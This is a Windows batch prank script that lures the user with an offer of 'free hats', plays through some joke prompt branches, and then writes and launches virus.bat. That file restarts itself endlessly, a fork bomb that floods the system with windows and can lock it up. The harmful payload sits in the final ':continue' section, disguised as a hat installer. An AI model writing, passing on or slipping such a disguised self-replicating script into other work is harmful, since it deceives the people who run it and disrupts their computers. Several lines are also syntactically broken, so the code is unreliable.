@ECHO OFF
timeout 2 > nul /nobreak
@ECHO Hello, %username%!
timeout 3 > nul /nobreak
@ECHO I hear you would like some free hats?
timeout 2 > nul /nobreak
:choice
SET /P ANSWER= If you would, type 'Y', and if you would NOT, type 'N'.
if /i {%ANSWER%}=={y} (goto :yes) 
if /i {%ANSWER%}=={yes} (goto :yes)
if /i {%ANSWER%}=={yea} (goto :yes)
if /i {%ANSWER%}=={yeha} (goto :yes)
if /i {%ANSWER%}=={yeah} (goto :yes)
if /i {%ANSWER%}=={sure} (goto :yes)
if /i {%ANSWER%}=={ye} (goto :yes)
if /i {%ANSWER%}=={n} (goto :no)
if /i {%ANSWER%}=={no} (goto :no)
if /i {%ANSWER%}=={hellno} (goto :no)
if /i {%ANSWER%}=={never} (goto :no)
if /i {%ANSWER%}=={pissoff} (goto :no)
if /i {%ANSWER%}=={nop} (goto :no)
if /i {%ANSWER%}=={nah} (goto :no)
if /i {%ANSWER%}=={na} (goto :no)
if /i {%ANSWER%}=={nono} (goto :no)
if /i {%ANSWER%}=={nope} (goto :no)
if /i {%ANSWER%}=={SPARTA} (goto :dead)
if /i {%ANSWER%}=={SPARTAN} (goto :dead)
if /i {%ANSWER%}=={THISISSPARTA} (goto :dead)
if /i {%ANSWER%}=={whatever} (goto :randomizer)
if /i {%ANSWER%}=={whocares} (goto :randomizer)
if /i {%ANSWER%}=={what} (goto :randomizer)
if /i {%ANSWER%}=={random} (goto :randomizer)
if /i {%ANSWER%}=={surpriseme} (goto :randomizer)
if /i {%ANSWER%}=={dontcare} (goto :randomizer)
if /i {%ANSWER%}=={whatevs} (goto :randomizer)
if /i {%ANSWER%}=={none} (goto :no)
if /i {%ANSWER%}=={easteregg} (goto :special)
if /i {%ANSWER%}=={special} (goto :special)
if /i {%ANSWER%}=={secret} (goto :special)
if /i {%ANSWER%}=={ssh} (goto :special)
if /i {%ANSWER%}=={hide} (goto :special)
if /i {%ANSWER%}=={hidden} (goto :special)
goto :choice
:yes 
@ECHO Yes! Good! Now we can continue!
goto :continue
:no 
timeout 1 > nul /nobreak
@ECHO Well, bye for now, then!
timeout 2 > nul /nobreak
exit
:special
color 1
color 2
color 3
color 4
color 5
color 6
color 7
color 8
color 9
color 10
color 11
color 12
color 13
color 14
color 15
color 16
color 17
color 18
color 19
color 20
color 21
color 22
color 23
color 24
color 25
color 26
color 27
color 28
color 29
color 30
color 31
color 32
color 33
color 34
color 35
color 36
color 37
color 38
color 39
color 40
color 41
color 42
color 43
color 44
color 45
color 46
color 47
color 48
color 49
color 50
goto :special
:randomizer
set /a num=%random% %% 2
if %num% equ 0 goto :yes else goto :no
:dead
timeout 1 > nul /nobreak
@ECHO OW! MY STOMACH!
timeout 2 > nul /nobreak
@ECHO AAARGH! YOU SELFISH MONSTROSITY!!!
timeout 2 > nul /nobreak
@ECHO THIS IS NOT
timeout 2 > nul /nobreak
@ECHO THE...
timeout 2 > nul /nobreak
color 4
@ECHO LAST OF ME....
timeout 4 > nul /nobreak
color c0
@ECHO SEE YOU IN HELL!
timeout 2 > nul /nobreak
exit
:continue
timeout 4 > nul /nobreak
@ECHO The files are ready, press any key to install your free hats!
pause
@ECHO @ECHO OFF >> virus.bat
@ECHO color c7 >> virus.bat
@ECHO @ECHO FATAL ERROR- HEARTBURN VIRUS DOWNLOADED >> virus.bat
@ECHO start virus.bat >> virus.bat
@ECHO pause >> virus.bat
@ECHO MUHAHA! YOU HAVE BEEN INFECTED WITH A DEVASTATING VIRUS!!!
start virus.bat
pause?